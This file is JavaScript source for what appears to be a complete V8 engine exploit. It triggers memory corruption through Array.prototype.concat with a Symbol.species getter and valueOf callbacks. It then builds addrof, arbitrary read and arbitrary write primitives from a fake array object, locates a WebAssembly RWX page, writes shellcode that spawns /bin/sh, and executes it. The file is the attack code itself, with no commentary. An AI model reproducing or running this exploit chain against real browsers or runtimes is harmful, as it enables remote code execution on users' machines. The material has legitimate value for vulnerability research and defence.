var buf = new ArrayBuffer(8); 
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);
var f32_buf = new Float32Array(buf);

function ftoi(val) { 
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); 
}

function ftoi32(val) {
    f32_buf[0] = val;
    return BigInt(u64_buf[0]&0xffffffffn);
}

function itof(val) { 
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function itof32(val) {
    u64_buf[0] = Number(val&0xffffffffn);
    return f32_buf[0];
}

function write_shellcode(){
    shellcode = [0x90909090d2314850n, 0x69622fbb48f63148n, 0x5f545368732f2f6en, 0x90909090050f3bb0n];
    aaw(backingStoreAddr, rwx);

    for(let i =0; i<shellcode.length;i++){
        dataview.setFloat64(i*Float64Array.BYTES_PER_ELEMENT, itof(shellcode[i]), true);
    }
}

var fake_object, addrof_array, corrupted_array;
var map, elem;

function foo(){
    class Leaky extends Float64Array {}

    let x = new Leaky (1024);
    x.__defineSetter__('length', function() {});


    a = [
        , 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9 
    ];

    fake_object = new Float32Array(16);

    addrof_array = [{}, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9];

    const C = new Function();
    C.__defineGetter__(Symbol.species, () => {
        return function() { return x; }
    });
    a.constructor = C;

    Array.prototype[0] = {
        valueOf: function() {
            a.length = 1;
            new ArrayBuffer(0x7fe00000);
            delete Array.prototype[0];
        }
    };

    Array.prototype.concat.call(a);
    map = ftoi(x[1]);
    elem = ftoi(x[2]);
}

function bar(){
    class Leaky extends Float64Array {}

    let x = new Leaky (1024);
    x.__defineSetter__('length', function() {});


    var a = [
        1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        1.1, /* hole */ , 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, {} // HOLEY_ELEMENTS
    ];

    var fake_jsarray_object_ptr = new Float32Array(16);
    fake_jsarray_object_ptr[0] = itof32(addr_fake_obj&0xffffffffn);

    const C = new Function();
    C.__defineGetter__(Symbol.species, () => {
        return function() { return x; }
    });
    a.constructor = C;

    fake_object[0] = itof32(map&0xffffffffn);
    fake_object[1] = itof32(map>>32n);
    fake_object[2] = itof32(elem&0xffffffffn);
    fake_object[3] = itof32(elem>>32n);

    Array.prototype[19] = {
        valueOf: function() {
            a.length = 1;
            new ArrayBuffer(0x7fe00000);
            Object.prototype.valueOf = function() {
                corrupted_array = this;
                delete Object.prototype.valueOf;
                throw 'bailout';
                return 42;
            }

            delete Array.prototype[19];
            return 1.1;
        }
    };

    var c = Array.prototype.concat.call(a);
}

function addrof(obj){
    fake_object[2] = itof32(addr_addrof_array);
    addrof_array[0] = obj;
    return ftoi(corrupted_array[0]);
} 

function aar(addr){
    fake_object[2] = itof32(addr);
    return ftoi(corrupted_array[0]);
}

function aaw(addr, value){
    fake_object[2] = itof32(addr);
    corrupted_array[0] = itof(value);
}

foo();

console.log("Map: 0x" + map.toString(16));
console.log("Elements: 0x" + elem.toString(16));

var addr_fake_obj = elem + 0x60n;
var addr_addrof_array = elem + 0xe4n;

console.log("Fake Object: 0x" + addr_fake_obj.toString(16));
console.log("Addrof Array: 0x" + addr_addrof_array.toString(16));

try {
    bar();
} catch (error) { }

var target_buffer = new ArrayBuffer(0x500);
var dataview = new DataView(target_buffer);

let wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
let wasmModule = new WebAssembly.Module(wasmCode);
let wasmInstance = new WebAssembly.Instance(wasmModule);
     
let wasmFunction = wasmInstance.exports.main;
let rwx = aar(addrof(wasmInstance) + 0x60n);
let backingStoreAddr = addrof(target_buffer)+0xcn;

console.log("rwx: 0x" + rwx.toString(16));
console.log("backing store: 0x" + backingStoreAddr.toString(16));

write_shellcode();
wasmFunction();
